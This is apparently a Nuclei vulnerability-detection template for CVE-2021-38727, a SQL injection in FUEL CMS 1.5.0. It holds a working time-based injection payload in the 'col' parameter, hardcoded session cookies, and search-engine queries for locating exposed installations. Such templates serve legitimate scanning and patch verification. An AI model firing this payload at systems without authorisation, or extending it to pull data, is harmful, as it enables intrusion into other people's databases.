id: CVE-2021-38727

info:
  name: FUEL CMS 1.5.0 SQL Injection via 'col' parameter
  author: ProjectDiscoveryAI
  severity: critical
  description: FUEL CMS 1.5.0 allows SQL Injection via parameter 'col' in /fuel/index.php/fuel/logs/items.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Upgrade to FUEL CMS version 1.5.1 or later to mitigate the SQL Injection vulnerability.
  reference:
    - https://github.com/daylightstudio/FUEL-CMS/issues/582
    - https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38727
    - https://streamable.com/lxw3ln
    - https://www.nu11secur1ty.com/2021/10/cve-2021-38727.html
    - https://github.com/nu11secur1ty/CVE-mitre
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-38727
    cwe-id: CWE-89
    epss-score: 0.00219
    epss-percentile: 0.60701
    cpe: cpe:2.3:a:thedaylightstudio:fuel_cms:1.5.0:*:*:*:*:*:*:*
  metadata:
    vendor: thedaylightstudio
    product: fuel_cms
    shodan-query: http.title:"fuel cms"
    fofa-query: title="fuel cms"
    google-query: intitle:"fuel cms"

http:
  - method: GET
    path:
      - "{{BaseURL}}/fuel/index.php/fuel/logs/items?search=Search&col=(select(0)from(select(sleep(5)))v)&fuel_inline=0&limit=50&offset=0&order=desc&search_term=&type=info&view_type=list"

    headers:
      X-Requested-With: XMLHttpRequest
      Referer: "{{BaseURL}}/fuel/index.php/fuel"
      Cookie: "ci_session=65vnmrapcn6if41tmikfkhatkhs6ei5t; fuel_dccdd4a05cd593ba3584dfaa321e5caf=a%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22language%22%3Bs%3A7%3A%22english%22%3B%7D; fuel_ui_dccdd4a05cd593ba3584dfaa321e5caf=%257B%2522leftnav_h3%2522%253A%25220%257C0%257C0%257C0%2522%257D; fuel_dccdd4a05cd593ba3584dfaa321e5caf=a%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22language%22%3Bs%3A7%3A%22english%22%3B%7D; fuel_ui_dccdd4a05cd593ba3584dfaa321e5caf=%257B%2522leftnav_h3%2522%253A%25220%257C0%257C0%257C0%2522%257D; fuel_bar=%257B%2522show_editable_areas%2522%253A%25221%2522%257D"
      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
      Accept: "*/*"
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
